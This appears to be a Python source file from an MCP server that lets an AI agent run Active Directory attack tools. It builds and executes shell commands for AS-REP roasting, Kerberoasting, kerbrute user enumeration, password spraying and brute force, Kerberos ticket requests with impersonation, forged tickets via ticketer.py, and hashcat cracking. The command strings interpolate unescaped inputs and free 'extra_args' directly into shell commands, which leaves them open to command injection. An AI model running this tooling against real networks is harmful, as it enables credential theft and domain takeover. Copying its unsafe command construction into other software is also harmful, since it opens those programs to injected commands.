import time
from pathlib import Path
from typing import Literal

from adpilot_mcp.config import get_settings
from adpilot_mcp.core.executor import run_command_async
from adpilot_mcp.models.execution import CommandResult


def build_getnpusers_command(
    domain: str,
    output_file: str,
    username: str | None = None,
    password: str | None = None,
    usersfile: str | None = None,
    dc_ip: str | None = None,
    extra_args: str | None = None,
) -> str:
    target_str = f"{domain}/"
    if username:
        target_str += f"{username}"
        if password:
            target_str += f":{password}"
        else:
            target_str += " -no-pass"

    cmd = f"GetNPUsers.py {target_str} -request -outputfile '{output_file}'"
    if not username:
        cmd += " -no-pass"
    if usersfile:
        cmd += f" -usersfile '{usersfile}'"
    if dc_ip:
        cmd += f" -dc-ip {dc_ip}"
    if extra_args:
        cmd += f" {extra_args}"
    return cmd


async def run_getnpusers(
    domain: str,
    username: str | None = None,
    password: str | None = None,
    usersfile: str | None = None,
    dc_ip: str | None = None,
    extra_args: str | None = None,
    timeout: int = 120,
) -> CommandResult:
    settings = get_settings()
    output_dir = settings.ad_state_dir / f"getnpusers-{time.strftime('%Y%m%d-%H%M%S')}"
    output_dir.mkdir(parents=True, exist_ok=True)
    out_file = str(output_dir / "asrep.hash")
    cmd = build_getnpusers_command(
        domain, out_file, username, password, usersfile, dc_ip, extra_args
    )
    result = await run_command_async(cmd, timeout=timeout)
    result.extra["output_file"] = out_file
    return result


def build_getuserspns_command(
    domain: str,
    username: str,
    output_file: str,
    password: str | None = None,
    dc_ip: str | None = None,
    no_preauth: bool = False,
    use_kerberos: bool = False,
    hash_: str | None = None,
    extra_args: str | None = None,
) -> str:
    cmd = f"GetUserSPNs.py {domain}/"
    if no_preauth:
        cmd += f" -no-preauth {username}"
    else:
        cmd += f"{username}"
        if password:
            cmd += f":{password}"
        else:
            cmd += " -no-pass"
        if use_kerberos:
            cmd += " -k"
        if hash_:
            cmd += f" -hashes {hash_}"

    cmd += f" -request -outputfile '{output_file}'"
    if dc_ip:
        cmd += f" -dc-ip {dc_ip}"
    if extra_args:
        cmd += f" {extra_args}"
    return cmd


async def run_getuserspns(
    domain: str,
    username: str,
    password: str | None = None,
    dc_ip: str | None = None,
    no_preauth: bool = False,
    use_kerberos: bool = False,
    hash_: str | None = None,
    extra_args: str | None = None,
    timeout: int = 120,
) -> CommandResult:
    settings = get_settings()
    output_dir = settings.ad_state_dir / f"getuserspns-{time.strftime('%Y%m%d-%H%M%S')}"
    output_dir.mkdir(parents=True, exist_ok=True)
    out_file = str(output_dir / "kerberoast.hash")
    cmd = build_getuserspns_command(
        domain,
        username,
        out_file,
        password,
        dc_ip,
        no_preauth,
        use_kerberos,
        hash_,
        extra_args,
    )
    result = await run_command_async(cmd, timeout=timeout)
    result.extra["output_file"] = out_file
    return result


def build_kerbrute_command(
    domain: str,
    dc_ip: str,
    mode: Literal["userenum", "passwordspray", "bruteforce"],
    usersfile: str | None = None,
    bruteforcefile: str | None = None,
    password: str | None = None,
    safe: bool = False,
    extra_args: str | None = None,
) -> tuple[str | None, str | None]:
    """Returns (cmd, error_message). If error_message is not None, validation failed."""
    if not domain or not dc_ip:
        return (
            None,
            "Either a domain ('<domain>') or a domain controller IP address ('<dc_ip>') must be specified.",
        )

    cmd = f"/root/kerbrute {mode}"
    if mode == "userenum":
        if not usersfile:
            return (
                None,
                "'userenum' mode requires a 'usersfile' argument with a list of usernames to enumerate.",
            )
        if "rockyou.txt" in usersfile:
            return (
                None,
                "The 'rockyou.txt' wordlist is not allowed for use in this tool due to its size and potential for abuse. It is meant for offline password cracking with hashcat. Please use a smaller, custom wordlist instead.",
            )
        cmd += f" '{usersfile}'"
    elif mode == "passwordspray":
        if not usersfile or not password:
            return (
                None,
                "'passwordspray' mode requires a 'usersfile' and 'password' argument.",
            )
        if "rockyou.txt" in usersfile:
            return (
                None,
                "The 'rockyou.txt' wordlist is not allowed for use in this tool due to its size and potential for abuse. It is meant for offline password cracking with hashcat. Please use a smaller, custom wordlist instead.",
            )
        cmd += f" -users '{usersfile}' -password '{password}'"
    elif mode == "bruteforce":
        if not bruteforcefile:
            return None, "'bruteforce' mode requires a 'bruteforcefile' argument."
        if "rockyou.txt" in bruteforcefile:
            return (
                None,
                "The 'rockyou.txt' wordlist is not allowed for use in this tool due to its size and potential for abuse. It is meant for offline password cracking with hashcat. Please use a smaller, custom wordlist instead.",
            )
        cmd += f" '{bruteforcefile}'"
    else:
        return (
            None,
            f"Invalid mode '{mode}'. Valid modes are: 'userenum', 'passwordspray', 'bruteforce'.",
        )

    cmd += f" -d {domain} --dc {dc_ip}"
    if safe:
        cmd += " --safe"
    if extra_args:
        cmd += f" {extra_args}"
    return cmd, None


async def run_kerbrute(
    domain: str,
    dc_ip: str,
    mode: Literal["userenum", "passwordspray", "bruteforce"],
    usersfile: str | None = None,
    bruteforcefile: str | None = None,
    password: str | None = None,
    safe: bool = False,
    extra_args: str | None = None,
    timeout: int = 300,
) -> CommandResult:
    cmd, err = build_kerbrute_command(
        domain, dc_ip, mode, usersfile, bruteforcefile, password, safe, extra_args
    )
    if err:
        return CommandResult(
            command=f"kerbrute {mode}",
            stdout="",
            stderr=err,
            returncode=-1,
            success=False,
        )
    return await run_command_async(cmd, timeout=timeout)  # pyright: ignore[reportArgumentType]


def build_gettgt_command(
    domain: str,
    username: str,
    password: str | None = None,
    dc_ip: str | None = None,
    hashes: str | None = None,
    aes_key: str | None = None,
    use_kerberos: bool = False,
    extra_args: str | None = None,
) -> str:
    target_str = f"{domain}/{username}"
    if password:
        target_str += f":{password}"
    else:
        target_str += " -no-pass"

    cmd = f"getTGT.py {target_str}"
    if hashes:
        cmd += f" -hashes '{hashes}'"
    if aes_key:
        cmd += f" -aesKey {aes_key}"
    if use_kerberos:
        cmd += " -k -no-pass"
    if dc_ip:
        cmd += f" -dc-ip {dc_ip}"
    if extra_args:
        cmd += f" {extra_args}"
    return cmd


async def run_gettgt(
    domain: str,
    username: str,
    password: str | None = None,
    dc_ip: str | None = None,
    hashes: str | None = None,
    aes_key: str | None = None,
    use_kerberos: bool = False,
    extra_args: str | None = None,
    timeout: int = 120,
) -> CommandResult:
    cmd = build_gettgt_command(
        domain, username, password, dc_ip, hashes, aes_key, use_kerberos, extra_args
    )
    return await run_command_async(cmd, timeout=timeout)


def build_getst_command(
    domain: str,
    username: str,
    password: str | None = None,
    spn: str | None = None,
    impersonate: str | None = None,
    dc_ip: str | None = None,
    hashes: str | None = None,
    aes_key: str | None = None,
    use_kerberos: bool = False,
    extra_args: str | None = None,
) -> str:
    target_str = f"{domain}/{username}"
    if password:
        target_str += f":{password}"
    elif hashes:
        target_str += f" -hashes '{hashes}'"
    elif aes_key:
        target_str += f" -aesKey {aes_key}"
    else:
        target_str += " -no-pass"

    cmd = f"getST.py {target_str}"
    if spn:
        cmd += f" -spn '{spn}'"
    if impersonate:
        cmd += f" -impersonate '{impersonate}'"
    if dc_ip:
        cmd += f" -dc-ip {dc_ip}"
    if use_kerberos:
        cmd += " -k -no-pass"
    if extra_args:
        cmd += f" {extra_args}"
    return cmd


async def run_getst(
    domain: str,
    username: str,
    password: str | None = None,
    spn: str | None = None,
    impersonate: str | None = None,
    dc_ip: str | None = None,
    hashes: str | None = None,
    aes_key: str | None = None,
    use_kerberos: bool = False,
    extra_args: str | None = None,
    timeout: int = 120,
) -> CommandResult:
    cmd = build_getst_command(
        domain,
        username,
        password,
        spn,
        impersonate,
        dc_ip,
        hashes,
        aes_key,
        use_kerberos,
        extra_args,
    )
    return await run_command_async(cmd, timeout=timeout)


def build_ticketer_command(
    domain: str,
    username: str,
    domain_sid: str,
    nthash: str | None = None,
    aes_key: str | None = None,
    extra_args: str | None = None,
) -> tuple[str | None, str | None]:
    if not nthash and not aes_key:
        return None, "ticketer requires either 'nthash' or 'aes_key' to be specified."

    cmd = f"ticketer.py -domain {domain} -domain-sid {domain_sid} {username}"
    if nthash:
        cmd += f" -nthash {nthash}"
    elif aes_key:
        cmd += f" -aesKey {aes_key}"
    if extra_args:
        cmd += f" {extra_args}"
    return cmd, None


async def run_ticketer(
    domain: str,
    username: str,
    domain_sid: str,
    nthash: str | None = None,
    aes_key: str | None = None,
    extra_args: str | None = None,
    timeout: int = 120,
) -> CommandResult:
    cmd, err = build_ticketer_command(
        domain, username, domain_sid, nthash, aes_key, extra_args
    )
    if err:
        return CommandResult(
            command="ticketer.py",
            stdout="",
            stderr=err,
            returncode=-1,
            success=False,
        )
    return await run_command_async(cmd, timeout=timeout)  # pyright: ignore[reportArgumentType]


def build_hashcat_command(
    hash_file: str,
    hash_mode: int,
    outputfile: str,
    attack_mode: int = 0,
    wordlist: str | None = None,
    mask: str | None = None,
    extra_args: str | None = None,
) -> tuple[str | None, str | None]:
    cmd = f"hashcat -m {hash_mode} -a {attack_mode} {hash_file}"
    if attack_mode == 0:
        if not wordlist:
            return None, "Attack mode 0 requires a 'wordlist' argument."
        cmd += f" {wordlist}"
    elif attack_mode == 3:
        if not mask:
            return None, "Attack mode 3 requires a 'mask' argument."
        cmd += f" '{mask}'"
    cmd += f" -o {outputfile} --force --quiet"
    if extra_args:
        cmd += f" {extra_args}"
    return cmd, None


async def run_hashcat(
    hash_file: str,
    hash_mode: int,
    outputfile: str,
    attack_mode: int = 0,
    wordlist: str | None = None,
    mask: str | None = None,
    extra_args: str | None = None,
    timeout: int = 600,
) -> CommandResult:
    cmd, err = build_hashcat_command(
        hash_file, hash_mode, outputfile, attack_mode, wordlist, mask, extra_args
    )
    if err:
        return CommandResult(
            command="hashcat",
            stdout="",
            stderr=err,
            returncode=-1,
            success=False,
        )
    return await run_command_async(cmd, timeout=timeout)  # pyright: ignore[reportArgumentType]
